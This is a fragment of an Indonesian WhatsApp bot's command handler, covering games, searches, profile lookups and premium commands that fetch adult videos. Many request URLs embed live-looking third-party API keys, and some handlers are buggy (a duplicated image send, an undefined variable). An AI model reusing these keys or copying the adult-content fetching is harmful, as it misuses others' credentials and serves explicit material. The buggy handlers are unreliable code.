  const directoryPath = "/home/container/database/nikah";
  const targetData = nikah.yangdilamaar;
  const result = checkExistingDataInDirectory(directoryPath, targetData);
  if (result.status) {
      if (result.yangdilamar === text) return newReply('Orang tersebut sudah dinikahi!');
  }
  console.log(result); // Output the result
  var starGame = `@${m.sender.replace("@s.whatsapp.net", "")} Mengajak ${text} untuk menikah,ketik Y untuk menerima atau N untuk menolak!`
  juna.sendMessage(m.chat, { text: starGame, mentions: [m.sender, yangdilamar] }, { quoted: m })
}
break;

case'delcasino':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (fs.existsSync('./database/casino/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./database/casino/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (csn.Y.includes(m.sender)) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (isAdmins) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else if (isCreator) {
addCountCmd('#delcasino', m.sender, _cmd)
deleteCasino(m.chat)
newReply('Berhasil Menghapus Sesi Casino')
} else {
newReply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
}
} else {
newReply('Tidak ada sesi yang berlangsung')
}
break
// Search Menu
case'lirik': case 'liriklagu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *judul*\n\n_Contoh_\n\n${prefix+command} Bila Nanti`)
newReply(mess.wait)
addCountCmd('#lirik', m.sender, _cmd)
try{
let anu = await fetchJson('http://song-lyrics-api-o0m8tth8t-azharimm.vercel.app/search?q=' + text)
if(!anu.data) return newReply('server eror')
limitAdd(m.sender, limit)
let anuu = await fetchJson (anu.data[0].songLyrics)
let { artist, songTitle, songLyrics} = anuu.data
newReply('*Artis:* ' + artist + '\n*Title*: ' + songTitle + '\n*Lirik*: ' + songLyrics)
}catch (error) {
newReply(`Lirik Lagu Tidak Ditemukan`);
}
limitAdd(m.sender, limit)
}
break
case'grupwa': case'searchgrup':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *nama group*\n\n_Contoh_\n\n${prefix+command} store`)
newReply(mess.wait)
addCountCmd('#grupwa', m.sender, _cmd)
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return newReply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
newReply(teks)
limitAdd(m.sender, limit)
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(`Hasil pencarian dari ${q} tidak ditemukan`)

})
break
case 'ffstalk': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} id`)
newReply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
newReply(`Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} id|server`)
newReply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
newReply(`Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case'igstalk':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} juun4_`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${q}?apikey=6b882dde90583a8ea51d4fcf`)
const nick = anu.result.username
const nama = anu.result.fullname
const post = anu.result.posts
const foll = anu.result.followers
const foli = anu.result.following
const bio = anu.result.bio
await juna.sendMessage(m.chat, { image: { url: anu.result.photo_profile}, caption: `Nickname : ${nick}\nFullname : ${nama}\nPostingan : ${post}\nFollowers : ${foll}\nFollowing : ${foli}\nBio : ${bio}`}, {quoted: m})
await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}catch (error) {
newReply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
limitAdd(m.sender, limit)
}
break
case 'pinterest': case 'pin':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
newReply(`Silahkan ditunggu, jika bot tidak mengirimkan foto silahkan diulang command tersebut`)
let anu = await pinterest(text)
let result = anu[Math.floor(Math.random() * anu.length)]
juna.sendMessage(m.chat, { image: { url: result }, caption: 'Done kak'}, { quoted: m })
}
break
// case 'accrespon':{
//   if (!isCreator) return newReply('Fitur sedang dalam pengembangan')
//   await newReply('tekan y atau n untuk memproses')
//   let response = await newReply('Pilih y untuk melanjutkan atau n untuk membatalkan')
// // Mengambil pesan yang dikirim pengguna
//   let choice = response.quoted.text.toLowerCase().trim()
// // Memeriksa pilihan pengguna
//   if (choice === 'y') {
//     await newReply('kode y diterima melanjutkan eksekusi kode')
//     // Lakukan sesuatu jika pengguna memilih untuk melanjutkan
//     // Misalnya, lanjutkan dengan proses selanjutnya
//   } else if (choice === 'n') {
//     await newReply('kode n diterima membatalkan eksekusi kode')
//     // Lakukan sesuatu jika pengguna memilih untuk membatalkan
//     // Misalnya, memberikan pesan bahwa proses telah dibatalkan
//   } else {
//     // Lakukan sesuatu jika input tidak valid
//     // Misalnya, memberikan pesan bahwa input tidak valid
// }
// }
// break
case 'gimage': case 'googleimage':{
  if (isBan) return newReply('Lu di ban kocak')
  if (!isPremium) return newReply('Khusus premium sayank')
  if (!q) return newReply(`Masukkan perintah dengan cara ${prefix + command} Anime Loli Kawaii`)
  // react
  juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/gimage2?apikey=6b882dde90583a8ea51d4fcf&query=${q}`)
  const foto1 = anu.result[0]
  const foto2 = anu.result[1]
  const foto3 = anu.result[2]
  const foto4 = anu.result[3]
  const foto5 = anu.result[4]
  const foto6 = anu.result[5]
  const foto7 = anu.result[6]
  juna.sendMessage(m.chat, { image: { url: foto1}, caption: `Hasil dari pencarian ${text} Page 1`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto2}, caption: `Hasil dari pencarian ${text} Page 2`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto3}, caption: `Hasil dari pencarian ${text} Page 3`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto4}, caption: `Hasil dari pencarian ${text} Page 4`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto4}, caption: `Hasil dari pencarian ${text} Page 4`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto5}, caption: `Hasil dari pencarian ${text} Page 5`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto6}, caption: `Hasil dari pencarian ${text} Page 6`}, {quoted: m})
  sleep(3000)
  juna.sendMessage(m.chat, { image: { url: foto7}, caption: `Hasil dari pencarian ${text} Page 7`}, {quoted: m})
}
break
case 'gimage1':
case 'googleimage1':
{
    if (isBan) return newReply('Lu di ban kocak')
    if (!isPremium) return newReply('Khusus premium sayank')
    if (!q) return newReply(`Masukkan perintah dengan cara ${prefix + command} Anime Loli Kawaii`)
    
    // React
    juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    
    // Fetch images
    let anu = await fetchJson(`https://api.lolhuman.xyz/api/gimage2?apikey=6b882dde90583a8ea51d4fcf&query=${q}`)
    const foto1 = anu.result[0]
    
    // Function to send image with caption and delay
    const sendImageWithDelay = async (imageURL, caption) => {
        await juna.sendMessage(m.chat, { image: { url: imageURL }, caption: caption }, { quoted: m })
        await sleep(3000) // Delay 3 seconds
    }
    
    // Send image with delay
    await sendImageWithDelay(foto1, `Hasil dari pencarian ${q} Page 1`)
    
    // Ask user if they want to repeat the process
    let alo = await newReply('Gambar telah terkirim. Ulangi lagi? Ketik y/n untuk melanjutkan atau membatalkan')

    // Check if response is from specific sender and is 'y'
    // 344756
    gimage1[m.chat] = [
    await juna.sendText(m.chat, `wksksk`, m), result, 250,]
    if (m.text.toLowerCase() == 'y') {
    await newReply('mengeksekusi kode')
    } else {
      await newReply('alooo')
        // Do something if user chooses not to repeat
    }
    break; // End the switch statement
}

break
case 'apistatus':{
if (!isCreator) return newReply('Khusus Oener')
let anu = await fetchJson('https://api.lolhuman.xyz/api/checkapikey?apikey=6b882dde90583a8ea51d4fcf')
const user = anu.result.username
const totalhit = anu.result.requests
const todayhit = anu.result.today
const tipe = anu.result.account_type
const exp = anu.result.expired
await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/8060bd29b53c53aaac60f.jpg'}, caption: `*API Status*\n200\n\n*Username*\n${user}\n\n*Jumlah Requests*\n${totalhit}\n\n*Requests Hari Ini*\n${todayhit}\n\n*Tipe Akun*\nVIP Premium\n\n*Expired Pada*\n${exp}`}, {quoted: m})
// https://telegra.ph/file/8060bd29b53c53aaac60f.jpg
}
break
// case 'pinterest2': case 'pin2':{
// if (!isPremium) return newReply('Fitur Khusus Premium')
// if (isBan) return newReply('Lu di ban kocak akwowkaokwowko')
// if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
// juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
// try{
// newReply('Silahkan ditunggu,bot sedang meminta request ke API')
// let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=Ya8mZzbY6hsNFR4&query=${text}`)
// const fotonya1 = anu.result[0]
// const fotonya2 = anu.result[1]
// const fotonya3 = anu.result[2]
// const fotonya4 = anu.result[3]
// await juna.sendMessage(m.chat, { image: { url: fotonya1}, caption: `Hasil dari pencarian${text} Page 1`}, {quoted: m})
// await juna.sendMessage(m.chat, { image: { url: fotonya2}, caption: `Hasil dari pencarian${text} Page 2`}, {quoted: m})
// await juna.sendMessage(m.chat, { image: { url: fotonya3}, caption: `Hasil dari pencarian${text} Page 3`}, {quoted: m})
// await juna.sendMessage(m.chat, { image: { url: fotonya4}, caption: `Hasil dari pencarian${text} Page 4`}, {quoted: m})
// juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
// }catch (error) {
//   juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }})
//   try{
//   await sleep(3000)
//   juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
//   let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=JzhSmQ4Y5AerDXy&query=${text}`)
//   const fotonya1 = anu.result[0]
//   const fotonya2 = anu.result[1]
//   const fotonya3 = anu.result[2]
//   const fotonya4 = anu.result[3]
//   await juna.sendMessage(m.chat, { image: { url: fotonya1}, caption: `Hasil dari pencarian${text} Page 1`}, {quoted: m})
//   await juna.sendMessage(m.chat, { image: { url: fotonya2}, caption: `Hasil dari pencarian${text} Page 2`}, {quoted: m})
//   await juna.sendMessage(m.chat, { image: { url: fotonya3}, caption: `Hasil dari pencarian${text} Page 3`}, {quoted: m})
//   await juna.sendMessage(m.chat, { image: { url: fotonya4}, caption: `Hasil dari pencarian${text} Page 4`}, {quoted: m})
//   juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
// }
// }
// }

  
  
  

   //JzhSmQ4Y5AerDXy && Ya8mZzbY6hsNFR4 && ZFBsbrJfud5RA3g && MCkII8DRUo95Uo6
//  let anu = await fetchJson(`https://api.zonerweb.biz.id/api/webanime/anime?query=${text}&apikey=chiwa`)
// case 'pinterest2': case 'pin2': {
//   if (!isPremium) return newReply('Fitur Khusus Premium');
//   if (isBan) return newReply('Lu di ban kocak akwowkaokwowko');
//   if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`);
//   juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//   try {
//     newReply('Silahkan ditunggu, bot sedang meminta request ke API');
//     let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=Ya8mZzbY6hsNFR4&query=${text}`);
//     const fotonya1 = anu.result[0];
//     const fotonya2 = anu.result[1];
//     const fotonya3 = anu.result[2];
//     const fotonya4 = anu.result[3];
//     await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
//     await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
//     await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
//     await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
//     juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
//   } catch (error) {
//     //try ke 2
//     console.error(error);
//     juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//     try {
//       await sleep(3000);
//       juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//       let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=JzhSmQ4Y5AerDXy&query=${text}`);
//       const fotonya1 = anu.result[0];
//       const fotonya2 = anu.result[1];
//       const fotonya3 = anu.result[2];
//       const fotonya4 = anu.result[3];
//       await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
//       await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
//       await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
//       await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
//       juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
//     } catch (error) {
//       // try ke 3
//       console.error(error);
//       await sleep(3000);
//       juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }})
//       try {
//         juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//         let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=ZFBsbrJfud5RA3g&query=${text}`);
//         const fotonya1 = anu.result[0];
//         const fotonya2 = anu.result[1];
//         const fotonya3 = anu.result[2];
//         const fotonya4 = anu.result[3];
//         await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
//         await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
//         await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
//         await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
//         juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
//       } catch (error) {
//         //try ke 4
//         console.error(error);
//         juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//         try {
//           await sleep(3000);
//           juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//           let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=MCkII8DRUo95Uo6&query=${text}`);
//           const fotonya1 = anu.result[0];
//           const fotonya2 = anu.result[1];
//           const fotonya3 = anu.result[2];
//           const fotonya4 = anu.result[3];
//           await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
//           await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
//           await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
//           await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
//           juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});

    
  
// }
case 'pinterest2': case 'pin2': {
  if (!isPremium) return newReply('Fitur Khusus Premium');
  if (isBan) return newReply('Lu di ban kocak akwowkaokwowko');
  if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`);
  juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  try {
    newReply('Silahkan ditunggu, bot sedang meminta request ke API');
    let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=Ya8mZzbY6hsNFR4&query=${text}`);
    const fotonya1 = anu.result[0];
    const fotonya2 = anu.result[1];
    const fotonya3 = anu.result[2];
    const fotonya4 = anu.result[3];
    await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
    await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
    await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
    await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
    juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
  } catch (error) {
    console.error(error);
    juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
    try {
      await sleep(3000);
      juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
      let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=JzhSmQ4Y5AerDXy&query=${text}`);
      const fotonya1 = anu.result[0];
      const fotonya2 = anu.result[1];
      const fotonya3 = anu.result[2];
      const fotonya4 = anu.result[3];
      await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
      await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
      await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
      await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
      juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
    } catch (error) {
      console.error(error);
      await sleep(3000);
      juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
      try {
        juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
        let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=ZFBsbrJfud5RA3g&query=${text}`);
        const fotonya1 = anu.result[0];
        const fotonya2 = anu.result[1];
        const fotonya3 = anu.result[2];
        const fotonya4 = anu.result[3];
        await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
        await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
        await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
        await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
        juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
      } catch (error) {
        console.error(error);
        juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
        try {
          await sleep(3000);
          juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
          let anu = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/pinterest?apikey=MCkII8DRUo95Uo6&query=${text}`);
          const fotonya1 = anu.result[0];
          const fotonya2 = anu.result[1];
          const fotonya3 = anu.result[2];
          const fotonya4 = anu.result[3];
          await juna.sendMessage(m.chat, { image: { url: fotonya1 }, caption: `Hasil dari pencarian${text} Page 1` }, { quoted: m });
          await juna.sendMessage(m.chat, { image: { url: fotonya2 }, caption: `Hasil dari pencarian${text} Page 2` }, { quoted: m });
          await juna.sendMessage(m.chat, { image: { url: fotonya3 }, caption: `Hasil dari pencarian${text} Page 3` }, { quoted: m });
          await juna.sendMessage(m.chat, { image: { url: fotonya4 }, caption: `Hasil dari pencarian${text} Page 4` }, { quoted: m });
          juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
        } catch (error) {
          console.error(error);
          juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
        }
      }
    }
  }
}
break
case 'pixiv':{
  if (isBan) return newReply('Lu di ban njenk akwowkowkwok')
  if (!isPremium) return newReply('Khusus premium sayankk')
  if (!text) return newReply('Masukkan query!')
  //react
  try{
  await juna.sendMessage(m.chat, { react: { text: `🕧`, key: m.key }})
  let pixiv = await fetchJson(`https://api.lolhuman.xyz/api/pixiv?apikey=6b882dde90583a8ea51d4fcf&query=${text}`)
  const foto1 = pixiv.result[0].image
  const foto2 = pixiv.result[1].image
  const foto3 = pixiv.result[2].image
  const foto4 = pixiv.result[3].image
  const foto5 = pixiv.result[4].image
  const foto6 = pixiv.result[5].image
  const cap1 = pixiv.result[0].title
  const cap2 = pixiv.result[1].title
  const cap3 = pixiv.result[2].title
  const cap4 = pixiv.result[3].title
  const cap5 = pixiv.result[4].title
  const cap6 = pixiv.result[5].title
  await juna.sendMessage(m.chat, { image: { url: foto1 }, caption: `${cap1}`}, {quoted: m})
  await juna.sendMessage(m.chat, { image: { url: foto2 }, caption: `${cap2}`}, {quoted: m})
  await juna.sendMessage(m.chat, { image: { url: foto3 }, caption: `${cap3}`}, {quoted: m})
  await juna.sendMessage(m.chat, { image: { url: foto4 }, caption: `${cap4}`}, {quoted: m})
  await juna.sendMessage(m.chat, { image: { url: foto5 }, caption: `${cap5}`}, {quoted: m})
  await juna.sendMessage(m.chat, { image: { url: foto6 }, caption: `${cap6}`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
  }catch (error){
    await newReply('Data tidak ditemukan,gunakan query yang lebih umum!')
  }
  
}
//https://api.lolhuman.xyz/api/pixiv?apikey=6b882dde90583a8ea51d4fcf&query=chino%20kafuu
break
case 'nekopoi':{
  if (!isPremium) return newReply('Khusus premium njenk')
  if (!text) return newReply('Masukkan query yang ingin dicari!')
  await juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try{
  let getlinkbyquery = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=6b882dde90583a8ea51d4fcf&query=${text}`)
  const linknya = getlinkbyquery.result[0].link
  let detailhentai = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=6b882dde90583a8ea51d4fcf&url=${linknya}`)
  const fotonya = detailhentai.result.thumbnail
  const sinop = detailhentai.result.sinopsis
  const dllink = detailhentai.result.link['720p']['Mirror [ouo]'];
  const judul = detailhentai.result.title
  const durasi = detailhentai.result.duration
  await juna.sendMessage(m.chat, { image: { url: fotonya }, caption: `*Judul:* ${judul}\n\n*Sinopsis:* ${sinop}\n\n*Durasi:* ${durasi}\n\n*Link Download:*\n${dllink}`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
  }catch (error){
    await newReply('Error saat mengambil data!\nGunakan query yang lebih umum!')
    await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }})
  }
  

  
}
break
case 'xnxx':{
  if (isBan) return newReply('Lu di ban dongo akwaowkawoawoawk')
  if (!m.isGroup)return newReply('Cuman bisa dipake di grup kontol')
  if (!isPremium) return newReply('Khusus premium njenk akawomkawokawoawkok')
  if (!text) return newReply('Masukkan query yang ingin di download!')
  await juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
  let sus = await fetchJson(`https://api.maher-zubair.tech/nsfw/xnxx-search?q=${text}`)
  const suslink = sus.result[0].link
  let dllink = await fetchJson(`https://api.maher-zubair.tech/nsfw/xnxx-download?url=${suslink}`)
  const judulnya = dllink.result.title
  const deskripsi = dllink.result.description
  const ratingnya = dllink.result.rating
  const videonya = dllink.result.link[1].link
  const tipe = dllink.result.link[1].type
  const view = dllink.result.view
  const like = dllink.result.like
  await juna.sendMessage(m.chat, { video: { url: videonya }, caption: `*Judul*\n${judulnya}\n\n*Deskripsi*\n${deskripsi}\n\n*View*\n${view}\n\n*Rating*\n${ratingnya}\n\n*Like*\n${like}\n\n*Tipe Video*\n${tipe}`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}catch (error) {
  await newReply('Gagal mengambil data\nGunakan query yang lebhih umum!')
  await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }})
}
}
break
case 'edit': {
  if (!isCreator) return newReply('Mau ngapain?')
var nedd = [
"𝙼𝙴𝚁𝙴𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃 . . .", 
"𝙼𝙴𝚁𝙴𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃 . . .", 
"𝙼𝙴𝚁𝙴𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃 . . .", 
"𝙼𝙴𝚁𝙴𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃 . . .", 
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"《 ████████████》100%",
"𝚁𝙴𝚂𝚃𝙰𝚁𝚃 𝚂𝙴𝙻𝙴𝚂𝙰𝙸"
]
let { key } = await juna.sendMessage(m.chat, {text: '𝙼𝙴𝚁𝙴𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃 . . .'})

for (let i = 0; i < nedd.length; i++) {
/*await delay(10)*/
await juna.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
break
case 'hitungmundur': {
  if (!isCreator) return newReply('Mau ngapain?')
  
  let countdown = [];
  for(let i = 60; i >= 0; i--) {
    countdown.push(`Countdown: ${i} detik`);
  }
  
  let { key } = await juna.sendMessage(m.chat, {text: 'Mulai hitung mundur dari 60 detik.'});
  
  for (let i = 0; i < countdown.length; i++) {
    await delay(1000); // Delay per detik
    await juna.sendMessage(m.chat, {text: countdown[i], edit: key });
  }
  
  // Setelah hitung mundur selesai, edit pesan menjadi "Hitung mundur selesai"
  await juna.sendMessage(m.chat, {text: 'Hitung mundur selesai', edit: key });
}


break
case 'manga': case 'komik': case 'carimanga': case 'carikomik': case 'infomanga': case 'infokomik':{
if (isBan) return newReply('Lu diban kocak,ngapain mau pake bot😂😂')
if (!isPremium) return newReply('Khusus Premium sayank,makanya premium biar ngedukung admin buat ngembangin fiturnya🥰🥰')
if (!text) return newReply(`Masukkan judul manga yang ingin dicari dengan mengetik perintah\n${prefix+command} judul manga`)
await sleep(3000)
await juna.sendMessage(m.chat, { react: { text: `🕧`, key: m.key }})
let anu = await fetchJson(`https://api.zonerweb.biz.id/api/webanime/manga?query=${text}&apikey=chiwa`);
const fotonya = anu.result[0].attributes.posterImage.original
const ratingnya = anu.result[0].attributes.averageRating;
const sinopsis = anu.result[0].attributes.synopsis
const jepangnya = anu.result[0].attributes.titles.ja_jp
await juna.sendMessage(m.chat, { image: { url: fotonya }, caption: `*Judul:* ${jepangnya}\n\n*Sinopsis:* ${sinopsis}\n\n*Rating:* ${ratingnya}⭐`}, {quoted: m})
await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})





}
break
case 'yts': case 'ytsearch':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Cara membuat bot WhatsApp`)
let reso = await yts(`${text}`)
let aramat = reso.all
var tbuff = await getBuffer(aramat[0].image)
let teks = aramat.map(v => {
switch (v.type) {
case 'video': return `
📛 Title : *${v.title}* 
⏰ Durasi: ${v.timestamp}
🚀 Diupload ${v.ago}
😎 Views : ${v.views}
🌀 Url : ${v.url}
`.trim()
case 'channel': return `
